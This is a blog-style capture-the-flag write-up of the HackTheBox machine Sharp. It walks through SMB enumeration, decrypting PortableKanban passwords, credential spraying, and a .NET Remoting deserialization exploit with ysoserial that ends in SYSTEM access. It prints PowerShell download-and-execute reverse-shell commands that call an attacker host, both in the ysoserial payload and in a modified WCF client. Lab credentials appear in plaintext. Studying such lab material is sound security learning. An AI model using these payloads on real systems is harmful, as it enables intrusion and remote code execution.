Hi, after a long time not posting anything on this blog because of my university workload. Let's get back to our normal routine of pwning. Today, I will do a writeup of retired HackTheBox machine - Sharp, which is rated 4.8 pts.

## Target enumeration

On the very first step, we want to do a nmap scan on the target (10.10.10.219).

### Nmap output

```bash
# Nmap 7.91 scan initiated Thu May 13 05:42:14 2021 as: nmap -sC -sV -oA nmap/sharp -v 10.10.10.219

Nmap done at Thu May 13 05:44:27 2021 -- 1 IP address (1 host up) scanned in 133.29 seconds
```

Nmap results provide us with different ports and service currently running on the remote host. We probably should focus on its SMB service.

### In-depth enumeration with CrackMapExec (CME)

Instead of the old-fashioned Metasploit's auxiliaries/scanners, CrackMapExec (CME) can help us empower our exploitation to a new level. You can install the tool with a single line

```shell
$ apt-get install crackmapexec
```

or you can have it by cloning into [byt3bl33d3r](https://github.com/byt3bl33d3r)/**[CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)** but you will need [Poetry](https://python-poetry.org/docs/#installation) to manage dependencies.

#### OS version

Now, let's check our target's OS version using CME (Windows 10.0 Build 17763 x64).

```shell
â”Œâ”€â”€(rootðŸ’€kali)-[/home/â€¦/HackTheBox/Sharp/opt/CrackMapExec]
â””â”€# poetry run crackmapexec.spec smb 10.10.10.219         
SMB         10.10.10.219    445    SHARP            [*] Windows 10.0 Build 17763 x64 (name:SHARP) (domain:Sharp) (signing:False) (SMBv1:False)
```

#### Shared objects & Access

Next, I'd like to login using empty username and password, a null-session, to get some free share-objects on the machine.

```bash
â”Œâ”€â”€(rootðŸ’€kali)-[/home/â€¦/HackTheBox/Sharp/opt/CrackMapExec]
â””â”€# poetry run crackmapexec.spec smb 10.10.10.219 -u '' -p '' --shares

SMB         10.10.10.219    445    SHARP            dev                             
SMB         10.10.10.219    445    SHARP            IPC$                            Remote IPC

```

The most notable one here is the `kanban` share-directory because we don't know what that is, indeed. A quick search on Google provides us that Kanban is a project management framework between users so that we can figure out it might contain important credentials.

#### Spider_plus JSON

Another thing you can do with CME is using its modules, in this case is `spider_plus` to crawl information from target host (directories, file names, sizes, ...) and save it as JSON under `/tmp/cme_spider_plus`.

```bash
â”Œâ”€â”€(rootðŸ’€kali)-[/home/â€¦/HackTheBox/Sharp/opt/CrackMapExec]
â””â”€# poetry run crackmapexec.spec smb 10.10.10.219 -u '' -p '' -M spider_plus 
SMB         10.10.10.219    445    SHARP            [*] Windows 10.0 Build 17763 x64 (name:SHARP) (domain:Sharp) (signing:False) (SMBv1:False)
SMB         10.10.10.219    445    SHARP            [-] Sharp\: STATUS_ACCESS_DENIED 
SPIDER_P... 10.10.10.219    445    SHARP            [*] Started spidering plus with option:

SPIDER_P... 10.10.10.219    445    SHARP            [*]        EXT: ['ico', 'lnk']
SPIDER_P... 10.10.10.219    445    SHARP            [*]       SIZE: 51200
SPIDER_P... 10.10.10.219    445    SHARP            [*]     OUTPUT: /tmp/cme_spider_plus

```

So organized, isn't it?

![](https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-14_11-22.png)

These are all the items we can enumerate with a null-session.

## Kanban share files

Using smbclient to connect to `kanban` directory on remote machine and download files back to our Linux.

```bash
# Connect to remote host with null credentials
smbclient -N //10.10.10.219/kanban

# Download all existing files
smb: \> mget *
```

You might want to take a look at those `.pk3` and `PortableKanban.exe` files as aforementioned, they are likely to contain useful information.

![](https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-14_11-32.png)

After downloading, you can extract the `pkb.zip` using `unzip`.

```bash
â”Œâ”€â”€(rootðŸ’€kali)-[/home/â€¦/Sharp/smb/kanban/pkb]
â””â”€# unzip pkb.zip

02c445fdc6a8b05ea23cd821534442e5  PortableKanban.pk3.md5
   
```

Skim through the files and we have these users in `PortableKanban.pk3`.

```json
/* PortableKanban.pk3 */
  "Users": [
    {
      "Id": "e8e29158d70d44b1a1ba4949d52790a0",
      "Name": "Administrator",
      "Initials": "",
      "Email": "",
      "EncryptedPassword": "k+iUoOvQYG98PuhhRC7/rg==", // Base64
      "Role": "Admin",
      "Inactive": false,
      "TimeStamp": 637409769245503700
    },
    {
      "Id": "0628ae1de5234b81ae65c246dd2b4a21",
      "Name": "lars",
      "Initials": "",
      "Email": "",
      "EncryptedPassword": "Ua3LyPFM175GN8D3+tqwLA==",
      "Role": "User",
      "Inactive": false,
      "TimeStamp": 637409769265925600
    }
  ]
```

### Reveal administrator password by re-configurating Kanban PK3 file

Since the passwords are encrypted, we need to find other ways to get in. We can abuse their own `PortableKanban.exe` to decrypt passwords for us since they are stored offline but you've might already known that only privileged users can read the password in plain text. Let's add ourselves in with *Admin* role by copy-paste `Administrator` section and change the name and id.

```json
/* PortableKanban.pk3 */	"Users": [    {      "Id": "e8e29158d70d44b1a1ba4949d52790a0",      "Name": "Administrator",      "Initials": "",      "Email": "",      "EncryptedPassword": "k+iUoOvQYG98PuhhRC7/rg==",      "Role": "Admin",      "Inactive": false,      "TimeStamp": 637409769245503700    },    {      "Id": "0628ae1de5234b81ae65c246dd2b4a21",      "Name": "lars",      "Initials": "",      "Email": "",      "EncryptedPassword": "Ua3LyPFM175GN8D3+tqwLA==",      "Role": "User",      "Inactive": false,      "TimeStamp": 637409769265925600    },    {      "Id": "e8e29158d70d44b1a1ba4949d52790a1", // We also need to change the id      "Name": "huy",      "Initials": "",      "Email": "",      "EncryptedPassword": "", 					// Empty password      "Role": "Admin",      "Inactive": false,      "TimeStamp": 637409769245503700    }  ]
```

Then we execute `PortableKanban.exe`, open Users tab in the setup dialog and we are now able to read the passwords.

### Alternative method

If you love doing thing *the-hard-way*, feel free to reverse the program and reproduce its decrypt method. Luckily, `PortableKanban.exe` and its components are compiled in C# which makes it easier for us.  

![](https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-14_11-55.png)



#### Finding credentials with dnSpy

Load the target's executables and DLLs  in dnSpy, we can have their decrypt method. The `Decrypt` function reads encrypted string as input, then uses `DESCryptoServiceProvider` with hardcoded key and IV to decrypt our string.

![Crypto.Decrypt](https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-14_14-21.png)

On line 62 and 65, from two magic bytes called `_rgbKey` and `_rgbIV`: 

```
		// Token: 0x04000001 RID: 1		private static byte[] _rgbKey = Encoding.ASCII.GetBytes("7ly6UznJ"); // Hex: 376c7936557a6e4a		// Token: 0x04000002 RID: 2		private static byte[] _rgbIV = Encoding.ASCII.GetBytes("XuVUm5fR");	// Hex: 587556556d356652
```

Talk a little about DES cipher, people use two common mode which are CBC (**cipher block chaining**) and ECB (**electronic code book**). But only CBC supports key and IV in combination to generate the block cipher.

![Source: Wikipedia](https://upload.wikimedia.org/wikipedia/commons/d/d3/Cbc_encryption.png)

So we are able to decrypt the password using [CyberChef](https://gchq.github.io/CyberChef/) with the following recipe will give us our plain password.

![](https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-14_14-32.png)

### Credentials spraying with CME

In this step, we will correspondingly put our usernames and passwords in two separate text file and let CME do the verification job for us.

```bash
# users.txt                   larsAdministrator                                                                                                    # passwords.txt G123HHrth234gRGG2@$btRSHJYTargâ”Œâ”€â”€(rootðŸ’€kali)-[/home/â€¦/HackTheBox/Sharp/opt/CrackMapExec]â””â”€# poetry run crackmapexec.spec smb 10.10.10.219 -u ../../users.txt -p ../../passwords.txt SMB         10.10.10.219    445    SHARP            [*] Windows 10.0 Build 17763 x64 (name:SHARP) (domain:Sharp) (signing:False) (SMBv1:False)SMB         10.10.10.219    445    SHARP            [+] Sharp\lars:G123HHrth234gRG 
```

Only `lars` can log in so we should excluded Administrator credentials for now.

### Credentials acquired

| Username      | Password        | Status  |
| ------------- | --------------- | ------- |
| Administrator | G2@$btRSHJYTarg | Invalid |
| lars          | G123HHrth234gRG | Valid   |

## User-level access

After using `lars` credentials, we are able to crawl his shared-objects with `spider_plus` module as following:

```bash
                                                                                                    â”Œâ”€â”€(rootðŸ’€kali)-[/home/â€¦/HackTheBox/Sharp/opt/CrackMapExec]â””â”€# poetry run crackmapexec.spec smb 10.10.10.219 -u lars -p G123HHrth234gRG -M spider_plus     2 â¨¯SMB         10.10.10.219    445    SHARP            [*] Windows 10.0 Build 17763 x64 (name:SHARP) (domain:Sharp) (signing:False) (SMBv1:False)SMB         10.10.10.219    445    SHARP            [+] Sharp\lars:G123HHrth234gRG SPIDER_P... 10.10.10.219    445    SHARP            [*] Started spidering plus with option:SPIDER_P... 10.10.10.219    445    SHARP            [*]        DIR: ['print$']SPIDER_P... 10.10.10.219    445    SHARP            [*]        EXT: ['ico', 'lnk']SPIDER_P... 10.10.10.219    445    SHARP            [*]       SIZE: 51200SPIDER_P... 10.10.10.219    445    SHARP            [*]     OUTPUT: /tmp/cme_spider_plus
```

We made the `.json` more readable by filtering out the time and file size.

```bash
                                                                                                    â”Œâ”€â”€(rootðŸ’€kali)-[/home/kali/HackTheBox/Sharp]â””â”€# cat 10.10.10.219_lars_spider.json | grep -v 'time\|size' | grep ': {' | awk -F\" '{print $2}'  IPC$			# directoryInitShutdownLSM_API_servicePIPE_EVENTROOT\\CIMV2SCM EVENT PROVIDERPSHost.132655164003465770.3392.DefaultAppDomain.powershellW32TIME_ALTWinsock2\\CatalogChangeListener-154-0Winsock2\\CatalogChangeListener-1dc-0Winsock2\\CatalogChangeListener-268-0Winsock2\\CatalogChangeListener-274-0Winsock2\\CatalogChangeListener-36c-0Winsock2\\CatalogChangeListener-42c-0atsvcepmappereventloglsassntsvcsscerpcsrvsvcvgauth-servicewkssvcdev				# directoryClient.exeRemotingLibrary.dllServer.exenotes.txt
```

While searching `lars` files, only those in `\\dev` seem important.

```bash
â”Œâ”€â”€(rootðŸ’€kali)-[/home/â€¦/HackTheBox/Sharp/smb/lars]â””â”€# smbclient -U 'lars' //10.10.10.219/dev G123HHrth234gRG                                    130 â¨¯Try "help" to get a list of possible commands.smb: \> ls  .

```

Two executables `Client.exe` and `Server.exe`, as well as their library, are also built in C#  so we can decompile them with dnSpy.

![](https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_10-02.png)

Then we have a *secret* endpoint listening on port `8888` with its username and password hardcoded in `Client.exe`

![Client.exe](https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_10-06.png)

The credentials are to be tested with CME whether they are valid.

![](https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_10-12.png)



### Credentials acquired

| Username      | Password                              | Status  |
| ------------- | ------------------------------------- | ------- |
| debug         | SharpApplicationDebugUserPassword123! | Valid   |
| Administrator | G2@$btRSHJYTarg                       | Invalid |
| lars          | G123HHrth234gRG                       | Valid   |

## Exploit local .NET debug service

As `debug` profile contains nothing but some useless folders (`IPC$`, `dev` and similarities for lars), we have to figure out how to connect to the endpoint on port 8888. Back to the `notes.txt`, I thought there is something to do with the .NET service and came across these two repos. You can take a look yourselves.

https://github.com/tyranid/ExploitRemotingService

> A tool to exploit .NET Remoting Services vulnerable to CVE-2014-1806 or CVE-2014-4149. It only works on Windows although some aspects *might* work in Mono on *nix.

https://github.com/frohoff/ysoserial (basically our payload wrapper)

> **ysoserial** is a collection of utilities and property-oriented programming "gadget chains" discovered in common java libraries that can, under the right conditions, exploit Java applications performing **unsafe deserialization** of objects. The main driver program takes a user-specified command and wraps it in the user-specified gadget chain, then serializes these objects to stdout. When an application with the required gadgets on the classpath unsafely deserializes this data, the chain will automatically be invoked and cause the command to be executed on the application host

We will use *ysoserial* to wrap our reverse-tcp PowerShell one-liner[^1] and call *ExploitRemotingService.exe* to pipe our wrapped payload into the mentioned vulnerable endpoint.

### Payload crafting and Network configuration

#### Useful PoC[^2] repositories

Because ExploitRemotingService doesn't provide us any release versions so we have to download and build the project manually with Visual Studio on our Windows VM[^3].

Additionally, I have to install [NDesk Options](http://www.ndesk.org/Options) library in order to successfully compile the solution. 

![](https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_11-27.png)

`ysoserial` has their portable version so we can simply download, unzip and use it.

Here is a brief look of `Server.exe` source code decompiled by dnSpy. The server is running on port `8888` with BinaryFormatter sink implemented. You can read about the details [here](https://docs.microsoft.com/en-us/dotnet/api/system.runtime.remoting.channels.binaryserverformattersink?view=netframework-4.8); simply put, we just need `ysoserial` to wrap our payload in BinaryFormatter mode.

Below is our crafting steps with `ysoserial` and `ExploitRemotingService`:

```powershell
### ysoserial.exeC:\Users\User\Desktop\ysoserial-1.34\Release>ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c "powershell IEX(new-object net.webclient).downloadString('http://10.10.16.3/reverse.ps1')"# Breakdown-f Formatter as BinaryFormatter-g TypeConfuseDelegate gadget-o Base64 output-c Create a reverse connection back to our IP using Powershell one-liner called reverse.ps1IEX(New-Object Net.WebClient).downloadString('http://10.10.16.3/reverse.ps1')### ExploitRemotingService.exeC:\Users\User\Desktop\ExploitRemotingService-master\ExploitRemotingService\bin\Release>ExploitRemotingService.exe -s --user=debug --pass="SharpApplicationDebugUserPassword123!" tcp://10.10.10.219:8888/SecretSharpDebugApplicationEndpoint raw <wrapped payload># Breakdown-s Pipe command input from stdin--user=debug & --pass="SharpApplicationDebugUserPassword123!" our endpoint credentials
```

#### Network re-routing on Windows and Linux

Before we can send our payload to target host, remember that currently our Linux machine is the only one can connect to HTB VPN, not our Windows. In order to establish a connection between Windows and HTB VPN, we have to do some routing.

The following section helps us turn Kali into a router and act as the gateway.

```bash
# Windows# We want to route any HTB connection to our Kali machine NAT-IP (192.168.157.133)C:\Windows\system32>route add 10.10.10.0 mask 255.255.255.0 192.168.157.133 OK!#	----------------------------------------------# Linux# Enable IP Forwarding$ echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward # Configurate iptables' rules to manage incomming packets# This rule forwards packets from HTB to our Windows machine# Breakdown: Forwarding chain for connection from tun0 to eth0 interface with related and/or established state$ iptables -A FORWARD -i tun0 -o eth0 -m state --state RELATED,ESTABLISHED -j ACCEPT # Accept packets sending back from Windows machine# Breakdown: Receive packets from Windows through eth0 interface then pass it on tun0 and send them to HTB$ iptables -A FORWARD -i eth0 -o tun0 -j ACCEPT# Re-routing NAT from HTB machine back to Windows# Breakdown: Create a NAT table with POSTROUTING chain that accept only IP from the source of eth0 and pass it through tun0 with MASQUERADE policy$ iptables -t nat -A POSTROUTING -s 192.168.157.0/24 -o tun0 -j MASQUERADE 
```

### PowerShell Reverse Connection

Finally, our Windows is able to send/receive packets from HTB machine through Kali.

Now we can send our payload to target remote host and wait for our reverse shell.

```shell
### ExploitRemotingService.exeC:\Users\User\Desktop\ExploitRemotingService-master\ExploitRemotingService\bin\Release>ExploitRemotingService.exe -s --user=debug --pass="SharpApplicationDebugUserPassword123!" tcp://10.10.10.219:8888/SecretSharpDebugApplicationEndpoint raw <wrapped payload>
```

After execute the above command, we has established a reverse PowerShell as user `lars`.

![](https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_13-17.png)

Browsing through `lars` directories, there is a `wcf` folder in Documents. This has also been mentioned in `notes.txt` about migrating the project from dotNET to WCF, so it might be the answer. Anyway, the machine's user flag is located in `C:\Users\lars\Desktop\user.txt`.

```powershell
    Directory: C:\Users\lars\Documents\wcfMode                LastWriteTime         Length Name                                                                  ----                -------------         ------ ----                                                                  d-----       11/15/2020   1:40 PM                .vs                                                                   d-----       11/15/2020   1:40 PM                Client                                                                d-----       11/15/2020   1:40 PM                packages                                                              d-----       11/15/2020   1:40 PM                RemotingLibrary                                                       d-----       11/15/2020   1:41 PM                Server                                                                -a----       11/15/2020  12:47 PM           2095 wcf.sln                                                               PS C:\Users\lars\Documents\wcf> 
```

Let's compress the wcf directory into `wcf.zip` then download it to our Linux shared directory

![](https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_14-09.png)

### Another secret endpoint and ...flag!

It turns out `wcf.zip` is also a C# project with source code inside, we can put it in Visual Studio and view the source. There is another secret endpoint that is currently running on port 8889 of the remote host.

![](https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_14-22.png)

Since we are in the same network with remote target, you can try change the IP to the machine (10.10.10.219) and run the code. But there is a problem.

![](https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_14-29.png)

We can't connect to our target because of invalid credentials. This program was meant to run as internal users of the remote host (like `lars` or `debug`). To impersonate `lars`, we will run our command-prompt with his net-username as following:

```
# Also type lars password when promptedC:\Windows\system32>runas /user:lars /netonly %ComSpec%
```

![](https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_14-33.png)

Now we are `lars` in his server, move to our malformed `wcf` project and run it again.

![](https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_14-36.png)

Successfully executed as `lars`. Now we will use the project's built-in function `InvokePowerShell` to escalate our privilege.

```c#
        public string InvokePowerShell(string scriptText)        {            Runspace runspace = RunspaceFactory.CreateRunspace();            runspace.Open();            Pipeline pipeline = runspace.CreatePipeline();            pipeline.Commands.AddScript(scriptText);            pipeline.Commands.Add("Out-String");            Collection <PSObject> results = pipeline.Invoke();            runspace.Close();            StringBuilder stringBuilder = new StringBuilder();            foreach (PSObject obj in results)            {                stringBuilder.AppendLine(obj.ToString());            }            return stringBuilder.ToString();        }    }
```

`Client.cs` is to be changed as below:

```c#
namespace Client {    public class Client    {        public static void Main() {            ChannelFactory<IWcfService> channelFactory = new ChannelFactory<IWcfService>(                new NetTcpBinding(SecurityMode.Transport),"net.tcp://10.10.10.219:8889/wcf/NewSecretWcfEndpoint"            );            IWcfService client = channelFactory.CreateChannel();            Console.WriteLine(client.InvokePowerShell("IEX(New-Object Net.WebClient).downloadString('10.10.16.3/reverse.ps1')"));        }    }
```

Re-build the project then execute `Client.exe` as `lars` gives us our reverse shell as `nt-authority system` 

![](https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_14-46.png)

And the flag is located in `C:\Users\Administrator\Desktop\root.txt`

```powershell
cd C:\Users\Administratordir    Directory: C:\Users\AdministratorMode                LastWriteTime         Length Name                                                                   ----                -------------         ------ ----                                                                   d-r---       11/12/2020   5:15 PM                3D Objects                                                             d-r---       11/12/2020   5:15 PM                Contacts                                                               d-r---       11/15/2020   1:42 PM                Desktop                                                                d-r---       11/15/2020   1:46 PM                Documents                                                              d-r---       11/12/2020   5:15 PM                Downloads                                                              d-r---       11/12/2020   5:15 PM                Favorites                                                              d-r---       11/12/2020   5:15 PM                Links                                                                  d-r---       11/12/2020   5:15 PM                Music                                                                  d-r---       11/12/2020   5:15 PM                Pictures                                                               d-r---       11/12/2020   5:15 PM                Saved Games                                                            d-r---       11/12/2020   5:15 PM                Searches                                                               d-r---       11/12/2020   5:15 PM                Videos                                                                 cd Desktopdir    Directory: C:\Users\Administrator\DesktopMode                LastWriteTime         Length Name                                                                   ----                -------------         ------ ----                                                                   -ar---        5/14/2021   6:02 AM             34 root.txt                                                               cat root.txt[REDACTED]PS C:\Users\Administrator\Desktop>
